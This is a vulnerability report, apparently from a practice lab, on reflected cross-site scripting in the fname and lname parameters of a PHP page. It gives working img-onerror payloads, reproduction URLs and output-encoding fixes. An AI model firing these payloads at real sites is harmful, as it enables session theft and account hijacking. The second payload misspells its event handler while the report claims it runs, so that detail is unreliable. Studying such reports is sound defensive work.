# Reflected Cross-Site Scripting (XSS) - Basic Input

## SUMMARY

I identified a Reflected Cross-Site Scripting (XSS) vulnerability in the `fname` and `lname` parameters of the application.

The application accepts user-controlled input through the `fname` and `lname` GET parameters and reflects it back to the page without proper sanitization or output encoding. By injecting malicious HTML/JavaScript payloads into these parameters, arbitrary code execution is achieved when the victim visits the crafted URL.

An attacker can craft a malicious URL and trick a victim into clicking it. Once the victim visits the page, the injected JavaScript executes in the context of the vulnerable application, triggering a `confirm(1)` popup.

## Vulnerability Type

**Cross-Site Scripting (XSS) - Reflected**

## Vulnerable Parameters

```
fname
lname
```

## Vulnerable URL

```
<https://kzlabs.in/1.php?fname=>'>anil<IMG SrC=x ONeRRoR=confirm(1)>&lname='>anil<IMG SrC=x ONeRRo=confirm(2)>
```

## Steps to Reproduce

1. Open the vulnerable page.
2. Replace the values of the `fname` and `lname` parameters with the following payloads:
    
    ```
    fname='>anil<IMG SrC=x ONeRRoR=confirm(1)>
    lname='>anil<IMG SrC=x ONeRRo=confirm(2)>
    ```
    
3. Visit the crafted URL:
    
    ```
    <https://kzlabs.in/1.php?fname=%27%3Eanil%3CIMG+SrC%3Dx+ONeRRoR%3Dconfirm%281%29%3E&lname=%27%3Eanil%3CIMG+SrC%3Dx+ONeRRo%3Dconfirm%282%29%3E>
    ```
    
4. Observe that the browser executes the injected payload and displays a `confirm(1)` popup.

## Payloads Used

```
fname: '>anil<IMG SrC=x ONeRRoR=confirm(1)>
lname: '>anil<IMG SrC=x ONeRRo=confirm(2)>
```

URL-encoded versions:

```
fname: %27%3Eanil%3CIMG+SrC%3Dx+ONeRRoR%3Dconfirm%281%29%3E
lname: %27%3Eanil%3CIMG+SrC%3Dx+ONeRRo%3Dconfirm%282%29%3E
```

## Proof of Concept

The application accepts the values of the `fname` and `lname` parameters and reflects them directly into the page HTML without proper sanitization.

The payload works by:

1. Breaking out of the existing HTML context using `'>`
2. Injecting an `<IMG>` tag with the `ONeRRoR` event handler
3. The `ONeRRoR` event triggers when the image fails to load (due to `SrC=x`, where `x` is an invalid source)
4. This executes the JavaScript `confirm(1)` and `confirm(2)`

```html
<!-- Injected payload rendered in the page: -->
'><img src="x" onerror="confirm(1)">
'><img src="x" onerror="confirm(2)">
```

This confirms that arbitrary JavaScript execution is possible through both parameters.

!First Name Parameter XSS
<img width="1919" height="1007" alt="image" src="https://github.com/user-attachments/assets/93773470-93ba-4179-8d59-84f02c80694a" />

!Last Name Parameter XSS
<img width="1919" height="962" alt="image" src="https://github.com/user-attachments/assets/fa4eccd9-625d-4bdc-b517-de2050efd246" />

## Impact

An attacker can craft a malicious link that, when opened by a victim, executes arbitrary JavaScript in the context of the vulnerable website. This could allow an attacker to:

- Steal session cookies and hijack user accounts
- Perform actions on behalf of the authenticated user
- Deface the webpage or manipulate its content
- Redirect users to malicious websites
- Capture keystrokes or sensitive information entered by the user

## Recommendation

To mitigate this vulnerability:

- **Output Encoding**: Use `htmlspecialchars()` (or an equivalent output-encoding function) before rendering user-controlled data in HTML to convert special characters to their HTML entities.
    
    ```php
    echo htmlspecialchars($_GET['fname'], ENT_QUOTES, 'UTF-8');
    ```
    
- **Input Validation**: Validate and sanitize all user inputs. Consider using a whitelist approach to allow only safe characters.
- **Content Security Policy (CSP)**: Implement a strict CSP to restrict the execution of inline scripts and unauthorized resources.
- **Context-Aware Escaping**: Use context-aware escaping based on where the data is placed (HTML body, attributes, JavaScript, etc.).
- **Web Application Firewall (WAF)**: Deploy a WAF, such as Cloudflare WAF, to help detect and block malicious XSS payloads.
- **Security Headers**: Implement security headers like `X-XSS-Protection` and `X-Content-Type-Options` for additional protection.

---
